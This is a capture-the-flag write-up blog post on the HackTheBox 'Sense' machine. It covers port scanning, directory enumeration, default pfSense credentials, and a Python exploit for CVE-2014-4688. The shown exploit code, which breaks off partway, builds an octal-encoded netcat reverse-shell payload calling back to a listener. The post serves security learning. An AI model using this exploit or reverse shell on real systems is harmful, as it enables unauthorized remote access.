<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>HackTheBox - Sense Writeup - SHAFIQAIMAN</title><meta name="Description" content="shafiqaiman.com is a cybersecurity/ethical hacking website that focus on publishing of writeup in HacktheBox, Tryhackme and other online CTF (capture the flag) challenge."><meta property="og:title" content="HackTheBox - Sense Writeup" />
<meta property="og:description" content="Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports.
1 2 3 4 5 6 7 8 9 10 11 12 13 nmap -p80,443 -sCV -oN nmap/sense 10.10.10.60 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/http lighttpd 1.4.35 |_http-server-header: lighttpd/1." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://shafiqaiman.com/posts/htb/sense/" /><meta property="og:image" content="https://shafiqaiman.com/posts/htb/sense/featured.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-13T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-11-13T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://shafiqaiman.com/posts/htb/sense/featured.png"/>
<meta name="twitter:title" content="HackTheBox - Sense Writeup"/>
<meta name="twitter:description" content="Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports.
1 2 3 4 5 6 7 8 9 10 11 12 13 nmap -p80,443 -sCV -oN nmap/sense 10.10.10.60 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/http lighttpd 1.4.35 |_http-server-header: lighttpd/1."/>
<meta name="application-name" content="SHAFIQAIMAN">
<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shafiqaiman.com/posts/htb/sense/" /><link rel="prev" href="https://shafiqaiman.com/posts/htb/mirai/" /><link rel="next" href="https://shafiqaiman.com/posts/htb/busqueda/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "HackTheBox - Sense Writeup",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/shafiqaiman.com\/posts\/htb\/sense\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/shafiqaiman.com\/posts\/htb\/sense\/featured.png",
                            "width":  1400 ,
                            "height":  1060 
                        }],"genre": "posts","keywords": "CVE-2014-4688, pfsense-default-creds, pfsense, gobuster, python, rce","wordcount":  709 ,
        "url": "https:\/\/shafiqaiman.com\/posts\/htb\/sense\/","datePublished": "2022-11-13T00:00:00+00:00","dateModified": "2022-11-13T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "SH∆FIQ ∆IM∆N"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content always-active" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Sense Writeup</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SH∆FIQ ∆IM∆N</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HacktheBox</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="13-11-2022">13-11-2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;709 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/sense/featured.png"
        data-srcset="/posts/htb/sense/featured.png, /posts/htb/sense/featured.png 1.5x, /posts/htb/sense/featured.png 2x"
        data-sizes="auto"
        alt="/posts/htb/sense/featured.png"
        title="/posts/htb/sense/featured.png" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#nmap">Nmap</a></li>
    <li><a href="#https-pfsense">Https: Pfsense</a>
      <ul>
        <li><a href="#gobuster">Gobuster</a></li>
        <li><a href="#https-changelogtxt">Https: /changelog.txt</a></li>
        <li><a href="#https-system-userstxt">Https: /system-users.txt</a></li>
        <li><a href="#https-pfsensedashboard">Https: Pfsense/Dashboard</a></li>
      </ul>
    </li>
    <li><a href="#foothold-cve-2014-4688">Foothold: CVE-2014-4688</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="nmap">Nmap</h2>
<p>Like always, I’m going to scan the IP Address by using <a href="https://nmap.org/" target="_blank" rel="noopener noreffer ">nmap</a> but I’m going to scan the full port first. Then, I’m going to scan the only open ports.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">443</span><span class="w"> </span><span class="o">-</span><span class="n">sCV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">sense</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">60</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">     </span><span class="n">lighttpd</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">35</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">lighttpd</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">35</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Did</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">follow</span><span class="w"> </span><span class="n">redirect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">60</span><span class="o">/</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">443</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">http</span><span class="w"> </span><span class="n">lighttpd</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">35</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">lighttpd</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">35</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="n">TLS</span><span class="w"> </span><span class="n">randomness</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">represent</span><span class="w"> </span><span class="n">time</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Login</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">Common</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="p">(</span><span class="n">eg</span><span class="p">,</span><span class="w"> </span><span class="n">YOUR</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">CompanyName</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">Somewhere</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">US</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2017</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">14</span><span class="n">T19</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">35</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">06</span><span class="n">T19</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">35</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Well, only <code>2</code> ports are open, which is port <code>80</code> and <code>443</code>. Based on the port and service itself, looks like I&rsquo;m dealing with the webserver this time. However, the scan results show me that the <code>url</code> on port <code>80</code> has been redirected to port <code>443</code> which is the <code>HTTPS</code> port.</p>
<h2 id="https-pfsense">Https: Pfsense</h2>
<p>I&rsquo;ve navigated to port <code>443</code> on my browser and accepted the <code>SSL</code> certificates. I&rsquo;ll check the certificate and nothing useful for me. Turn&rsquo;s out, it is a <a href="https://www.pfsense.org/" target="_blank" rel="noopener noreffer ">Pfsense</a> login page. Then, I&rsquo;ll try login in with the default credentials which is <code>admin:pfsense</code> and nothing unveil. By the look at the <code>index</code> page extension, this is a <code>PHP</code> webpage.</p>
<p><figure><a class="lightgallery" href="/posts/htb/sense/login-page.png" title="pfsense login page" data-thumbnail="/posts/htb/sense/login-page.png" data-sub-html="<h2>pfsense login page</h2><p>pfsense login page</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/sense/login-page.png"
            data-srcset="/posts/htb/sense/login-page.png, /posts/htb/sense/login-page.png 1.5x, /posts/htb/sense/login-page.png 2x"
            data-sizes="auto"
            alt="/posts/htb/sense/login-page.png" width="758" height="473" />
    </a><figcaption class="image-caption">pfsense login page</figcaption>
    </figure></p>
<h3 id="gobuster">Gobuster</h3>
<p>Then, I run the <a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener noreffer ">gobuster</a> to enumerate more on this webserver. Unfortunately, I can&rsquo;t find anything useful and it&rsquo;s just found empty directories. So, I ended up putting a bunch of extensions such as <code>php,txt,html,cgi</code> for the second scan, and it manage to find &ldquo;gold&rdquo;.</p>
<p><figure><a class="lightgallery" href="/posts/htb/sense/gobuster-scan.png" title="gobuster" data-thumbnail="/posts/htb/sense/gobuster-scan.png" data-sub-html="<h2>gobuster</h2><p>gobuster</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/sense/gobuster-scan.png"
            data-srcset="/posts/htb/sense/gobuster-scan.png, /posts/htb/sense/gobuster-scan.png 1.5x, /posts/htb/sense/gobuster-scan.png 2x"
            data-sizes="auto"
            alt="/posts/htb/sense/gobuster-scan.png" width="840" height="375" />
    </a><figcaption class="image-caption">gobuster</figcaption>
    </figure></p>
<h3 id="https-changelogtxt">Https: /changelog.txt</h3>
<p>The first file that caught my attention is called <code>changelog.txt</code>. Upon expecting the file it says <code>&quot;2 of 3 vulnerabilities have been patched&quot;</code>. This gives me an idea of this particular version having a severe flaw that hasn&rsquo;t been patched. I have 1/3 luck here, to find which one of the flaws is.</p>
<p><figure><a class="lightgallery" href="/posts/htb/sense/changelog-txt.png" title="changelog.txt" data-thumbnail="/posts/htb/sense/changelog-txt.png" data-sub-html="<h2>changelog.txt</h2><p>changelog.txt</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/sense/changelog-txt.png"
            data-srcset="/posts/htb/sense/changelog-txt.png, /posts/htb/sense/changelog-txt.png 1.5x, /posts/htb/sense/changelog-txt.png 2x"
            data-sizes="auto"
            alt="/posts/htb/sense/changelog-txt.png" width="701" height="265" />
    </a><figcaption class="image-caption">changelog.txt</figcaption>
    </figure></p>
<h3 id="https-system-userstxt">Https: /system-users.txt</h3>
<p>Anyways, I&rsquo;ve navigated to another text file called <code>system-users.txt</code> which leaks the username. However, the password says <code>&quot;company defaults&quot;</code>. Then, it makes me think it could be the box name which is <code>sense</code> just like <a href="https://shafiqaiman.com/hackthebox-nibbles-writeup/" target="_blank" rel="noopener noreffer ">nibbles</a> box that I did before, or the default <a href="https://www.pfsense.org/" target="_blank" rel="noopener noreffer ">Pfsense</a> credentials which is <code>pfsense</code>.</p>
<p><figure><a class="lightgallery" href="/posts/htb/sense/system-users-txt.png" title="found username" data-thumbnail="/posts/htb/sense/system-users-txt.png" data-sub-html="<h2>found username</h2><p>found username</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/sense/system-users-txt.png"
            data-srcset="/posts/htb/sense/system-users-txt.png, /posts/htb/sense/system-users-txt.png 1.5x, /posts/htb/sense/system-users-txt.png 2x"
            data-sizes="auto"
            alt="/posts/htb/sense/system-users-txt.png" width="406" height="196" />
    </a><figcaption class="image-caption">found username</figcaption>
    </figure></p>
<h3 id="https-pfsensedashboard">Https: Pfsense/Dashboard</h3>
<p>I&rsquo;ll try both credentials and the correct one is <code>pfsense</code> and it looks just like a generic pfsense dashboard, what do I expect :). However, it has the version number sitting in front of me which is <code>2.1.3-RELEASE</code>.</p>
<p><figure><a class="lightgallery" href="/posts/htb/sense/version-number.png" title="pfsense version" data-thumbnail="/posts/htb/sense/version-number.png" data-sub-html="<h2>pfsense version</h2><p>pfsense version</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/sense/version-number.png"
            data-srcset="/posts/htb/sense/version-number.png, /posts/htb/sense/version-number.png 1.5x, /posts/htb/sense/version-number.png 2x"
            data-sizes="auto"
            alt="/posts/htb/sense/version-number.png" width="527" height="324" />
    </a><figcaption class="image-caption">pfsense version</figcaption>
    </figure></p>
<h2 id="foothold-cve-2014-4688">Foothold: CVE-2014-4688</h2>
<p>Since this is an old box, I immediately find the exploit and cve with it. This vulnerability is assigned to <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-4688" target="_blank" rel="noopener noreffer ">CVE-2014-4688</a> and the description says <code>&quot;this CVE assign to 3 vulnerabilty found in pfsense&quot;</code>. However, one of them did not patch as the <code>changelog.txt</code> file expose to me. Luckily, I find this <a href="https://www.exploit-db.com/exploits/43560" target="_blank" rel="noopener noreffer ">exploit</a> on <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreffer ">exploit-db</a>. Which explores the vulnerability in post-authentication in the <code>status_rrd_graph_img.php</code> page but again I want to be &ldquo;l33t&rdquo; and create my exploits by copying the existent exploits. (Why not? lol). Credited to Ryan McFarland aka <a href="https://www.absolomb.com/" target="_blank" rel="noopener noreffer ">absolomb</a> and here are the results.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span> <span class="k">as</span> <span class="n">bs</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests.packages.urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-U&#39;</span><span class="p">,</span> <span class="s1">&#39;--username&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-P&#39;</span><span class="p">,</span> <span class="s1">&#39;--password&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-r&#39;</span><span class="p">,</span> <span class="s1">&#39;--rhost&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Remote IP&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-i&#39;</span><span class="p">,</span> <span class="s1">&#39;--lhost&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Listening IP&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;--lport&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Listening port&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_csrf</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;https://</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">rhost</span><span class="si">}</span><span class="s2">/index.php&#34;</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">soup</span> <span class="o">=</span> <span class="n">bs</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&#34;lxml&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">csrf</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span><span class="s1">&#39;__csrf_magic&#39;</span><span class="p">})[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">csrf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2"> &gt; /tmp/f&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="nb">oct</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">))</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="s2">&#34;0o&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">csrf</span> <span class="o">=</span> <span class="n">get_csrf</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">lhost</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">lport</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
